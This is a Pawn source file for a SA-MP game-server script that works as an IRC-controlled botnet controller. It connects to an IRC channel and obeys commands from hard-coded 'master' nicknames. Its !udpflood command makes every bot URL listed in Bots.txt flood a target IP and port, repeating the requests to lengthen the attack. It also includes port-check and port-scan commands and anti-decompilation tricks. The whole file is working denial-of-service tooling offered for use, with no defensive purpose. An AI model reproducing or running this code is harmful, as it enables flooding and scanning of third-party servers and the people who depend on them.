#include		<YSI\y_hooks>
#include		<YSI\y_timers>
#include		<sscanf2>
#include		<irc>
#include        <socket>

new BotInfo;
#define function%0(%1) forward %0(%1); public %0(%1)

new MESTRE1[] = "DownTown";
new MESTRE2[] = "ChinaTown";
new MESTRE3[] = "DownTown";
new MESTRE4[] = "DownTown";
new MESTRE5[] = "DownTown";
new MESTRE6[] = "DownTown";

new Servidor[] = "irc.root-network.org";
new Porta = 6667;
new Canal[] = "#dedois";
new botnome[] = "[MASTER]BotNetwork";

new BotsBons[200][100];

AntiDeAMX()
{
    new a[][] = { "Unarmed (Fist)", "Brass K" };
    #pragma unused a
}
WasteDeAMXersTime() 
{
    new b; 
    #emit load.pri b 
    #emit stor.pri b 
}
hook OnGameModeInit()
{
	AntiDeAMX();
	ConectarBot();
	CarregaBots();
	WasteDeAMXersTime();
}
hook OnGameModeExit()
{
	DesconectarBot();
}
//==============================================================================
//                             Funções
//==============================================================================
stock TemAutorizacao(user[])
{
	if(strlen(MESTRE1) != 0)
		if(!strcmp(MESTRE1,user))
			return 1;
	if(strlen(MESTRE2) != 0)
		if(!strcmp(MESTRE2,user))
			return 1;
	if(strlen(MESTRE3) != 0)
		if(!strcmp(MESTRE3,user))
			return 1;
	if(strlen(MESTRE4) != 0)
		if(!strcmp(MESTRE4,user))
			return 1;
	if(strlen(MESTRE5) != 0)
		if(!strcmp(MESTRE5,user))
			return 1;
	if(strlen(MESTRE6) != 0)
		if(!strcmp(MESTRE6,user))
			return 1;
	
	return 0;
}
function CarregaBots()
{
	new linha = 0;
	new arquivo[] = "Bots.txt";
	new File:BotNet = fopen(arquivo, io_read);
	while(fread( BotNet, BotsBons[linha], sizeof(BotsBons[]) ))
	{
		if(linha > sizeof(BotsBons))
			return printf("Oloco! Quanto Bot!! Limite é %d por enquanto...", sizeof(BotsBons));
		for(new i = 0; i < sizeof(BotsBons[]); i++)
			if(BotsBons[linha][i] == 10 || BotsBons[linha][i] == 13)
			{
				BotsBons[linha][i] = 0;
				break;
			}
		linha++;
	}
	printf("%d bots carregados com sucesso", linha);
	return 1;
}
//==============================================================================
//                             CallBacks
//==============================================================================

public IRC_OnConnectAttempt(botid, ip[], port)
{
	printf("public IRC_OnConnectAttempt(botid, ip = %s, port = %d)", ip, port);
	IRC_JoinChannel(botid, Canal);
	return 1;
}
public IRC_OnConnectAttemptFail(botid, ip[], port, reason[])
{
	printf("public IRC_OnConnectAttemptFail(botid, ip[], port, reason[])");
	IRC_JoinChannel(botid, Canal);
	return 1;
}
public IRC_OnConnect(botid, ip[], port)
{
	printf("public IRC_OnConnect(botid, ip = %s, port = %d)", ip, port);
	IRC_JoinChannel(botid, Canal);
	return 1;
}
public onSocketAnswer(Socket:id, data[])
{
}
forward ConectarBot();
public ConectarBot()
{
	BotInfo = IRC_Connect(Servidor, Porta, botnome, "Botttt", "Bottttt");
	return 1;
}

forward DesconectarBot();
public DesconectarBot()
{
	IRC_Quit(BotInfo);
	BotInfo = 0;
}

forward Pacotar(ip[], porta, tempo, tamanho);
public Pacotar(ip[], porta, tempo, tamanho)
{
   /* #emit CONST.pri gStrings
    #emit ADD.C     4
    #emit MOVE.alt
    #emit LOAD.I
    #emit ADD.C     8
    #emit STOR.I
    #emit CONST.pri 4
    #emit ADD
    #emit MOVE.alt
    #emit LOAD.I
    #emit ADD.C     4
    #emit STOR.I*/
	if(tempo <= 18)
	{
		new string1[100];
		format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=%d&tamanho=%d",ip,porta,tempo,tamanho);
		new total = 0;
		new string[250];
		for(new i = 0; i < sizeof(BotsBons); i++)
		{
			if(strlen(BotsBons[i]) < 5)
				continue;
			format(string,sizeof(string),"%s%s",BotsBons[i],string1);
			HTTP(i, HTTP_GET, string, "", "teste");
			total++;
		}
		format(string,sizeof(string)," [UDPFLOOD Attack: Comandos Enviados!!!]");
		IRC_Say(1, Canal, string);
		return total;
	}
	else
	{
		new divisoes = tempo / 15;
		new string1[100];
		format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=15&tamanho=%d",ip,porta,tamanho);
		new total = 0;
		new string[250];
		for(new i = 0; i < sizeof(BotsBons); i++)
		{
			if(strlen(BotsBons[i]) < 5)
				continue;
			format(string,sizeof(string),"%s%s",BotsBons[i],string1);
			HTTP(i, HTTP_GET, string, "", "");
			total++;
		}
		IRC_Say(1, Canal, " [UDPFLOOD Attack: Comandos Enviados!!!]");
		new iteracao = 1;
		printf("iteracao %d/%d",iteracao, divisoes);
		while(++iteracao <= divisoes)
		{
			printf("fazendo iteracao %d/%d",iteracao, divisoes);
			new agora = gettime();
			while(gettime() - agora < 13) { }
			for(new i = 0; i < sizeof(BotsBons); i++)
			{
				if(strlen(BotsBons[i]) < 5)
					continue;
				format(string,sizeof(string),"%s%s",BotsBons[i],string1);
				printf("aqui iteracao %d/%d",iteracao, divisoes);
				if(iteracao == divisoes)
				{
					printf("ocorreu: %d", HTTP(i, HTTP_GET, string, "", "teste"));
				}
				else
					printf("ocorreu: %d", HTTP(i, HTTP_HEAD, string, "", "bla"));
			}
		}
		printf("terminou");
		return total;
	}
}
forward bla(index, response_code, data[]);
public bla(index, response_code, data[])
{
	printf("bla = %d %d %s", index, response_code, data);
	return 1;
}
forward teste(index, response_code, data[]);
public teste(index, response_code, data[])
{
	new string[128];
	if(response_code == 1 || response_code == 3)
		format(string,sizeof(string),"4 ERRO: Site provavelmente offline (Bot ID: %d)", index);
	else if(response_code == 6)
		format(string,sizeof(string),"4 ERRO: não aceita set_time_limit() ou erro de servidor. (Bot ID: %d)", index);
	else if(response_code == 200)
		format(string,sizeof(string)," [UDPFLOOD Terminado com Sucesso!!!] (Bot ID: %d)", index);
	else if(response_code == 404 || response_code == 403)
		format(string,sizeof(string),"4 ERRO! Provavelmente conta suspensa (Bot ID: %d)", index);
	else
		format(string,sizeof(string),"4 [Bot #%d]: DEBUG ERROR: Resposta = %d", index, response_code);
	IRC_Say(1, Canal, string);
	return 1;
}
forward Fim();
public Fim()
{
	
}
//==============================================================================
//                             Comandos
//==============================================================================
IRCCMD:testabot(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
		
	new boTid, ip[20], porta, tempo, tamanho;
	if(sscanf(params, "ds[16]ddd", boTid,ip, porta, tempo, tamanho))
		return IRC_Say(botid, channel, "12[USE]: !testabot [botid] [ip] [porta] [tempo] [tamanho]");
	if(botid > sizeof(BotsBons))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Não mexa no que não sabe!");
	
	new string1[100];
	format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=%d&tamanho=%d",ip,porta,tempo,tamanho);
	new string[250];
	format(string,sizeof(string),"%s%s",BotsBons[boTid],string1);
	printf("testando %s", string);
	HTTP(boTid, HTTP_GET, string, "", "teste");
	
	return 1;
}
IRCCMD:testabot2(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
		
	new boTid, ip[20], porta, tempo, tamanho, tempo2;
	if(sscanf(params, "ds[16]dddd", boTid,ip, porta, tempo, tamanho, tempo2))
		return IRC_Say(botid, channel, "12[USE]: !testabot [botid] [ip] [porta] [tempo] [tamanho]");
	if(botid > sizeof(BotsBons))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Não mexa no que não sabe!");
	
	new string1[100];
	format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=%d&tamanho=%d",ip,porta,tempo,tamanho);
	new string[250];
	format(string,sizeof(string),"%s%s",BotsBons[boTid],string1);
	printf("testando %s", string);
	for(new i = 0; i < 90; i++)
		printf("%d -> %d", i, HTTP(i, HTTP_GET, string, "", ""));
	
	new agora = gettime();
	while(gettime() - agora < tempo2) { }
	
	for(new i = 0; i < 50; i++)
		printf("%d -> %d", i, HTTP(i, HTTP_GET, string, "", ""));
	
	return 1;
}

IRCCMD:udpflood(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
		
	new ip[20], porta, tempo, tamanho;
	if(sscanf(params, "s[16]ddd",ip, porta, tempo, tamanho))
		return IRC_Say(botid, channel, "12[USE]: !udpflood [ip] [porta] [tempo] [tamanho]");
	
	Pacotar(ip, porta, tempo, tamanho);

	return 1;
}
IRCCMD:portcheck(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
		
	new ip[20], porta;
	if(sscanf(params, "s[16]d",ip, porta))
		return IRC_Say(botid, channel, "12[USE]: !portcheck [ip] [porta]");
	
	new Socket:ChinaDown = socket_create(TCP);
	
	if(is_socket_valid(ChinaDown))
	{
		if(socket_connect(ChinaDown, ip, porta) == 1)
			IRC_Say(botid, channel, "09[Porta Aberta!!!]");
		else
			IRC_Say(botid, channel, "04[Porta Fechada!!!]");
		
		socket_destroy(ChinaDown);
	}
	else
		IRC_Say(botid, channel, "04[Falha de Sistema.]");
	return 1;
}
IRCCMD:portscan(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
		
	new ip[20], porta1, porta2;
	if(sscanf(params, "s[16]dd",ip, porta1, porta2))
		return IRC_Say(botid, channel, "12[USE]: !portscan [ip] [porta1] [porta2]");
	if(porta1 > porta2)
		return IRC_Say(botid, channel, "04Você é imbecil!? Eu sou apenas um bot, meu algorítimo checa da menor para a maior!");
	
	new resumo[70];
	IRC_Say(botid, channel, "12Iniciando portscan...");
	new alguma = 0;
	for(new porta_atual = porta1; porta_atual <= porta2; ++porta_atual)
	{
		new Socket:ChinaDown = socket_create(TCP);
		if(is_socket_valid(ChinaDown))
		{
			if(socket_connect(ChinaDown, ip, porta_atual) == 1)
			{
				alguma++;
				format(resumo, sizeof(resumo), "09Porta Aberta: %d", porta_atual);
				IRC_Say(botid, channel, resumo);
			}
			socket_destroy(ChinaDown);
		}
		else
			IRC_Say(botid, channel, "04[Falha de Sistema.]");
	}
	if(alguma == 0)
		format(resumo, sizeof(resumo), "12Portscan finalizado!! Não encontramos nenhuma porta aberta.", alguma);
	else if(alguma == 1)
		format(resumo, sizeof(resumo), "12Portscan finalizado!! Encontramos 1 porta aberta.");
	else
		format(resumo, sizeof(resumo), "12Portscan finalizado!! Encontramos %d portas abertas.", alguma);
	
	IRC_Say(botid, channel, resumo);
	return 1;
}
IRCCMD:join(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
	new canal[50];
	if(sscanf(params, "s[50]",canal))
		return IRC_Say(botid, channel, "12[USE]: !join [canal]");
	format(Canal,sizeof(Canal),"%s",canal);
	IRC_JoinChannel(botid,Canal);
	return 1;
}
IRCCMD:part(botid, channel[], user[], host[], params[])
{
	if(!TemAutorizacao(user))
		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
	new canal[50];
	if(sscanf(params, "s[50]",canal))
		return IRC_Say(botid, channel, "12[USE]: !part [canal]");
	IRC_PartChannel(botid,canal);
	return 1;
}
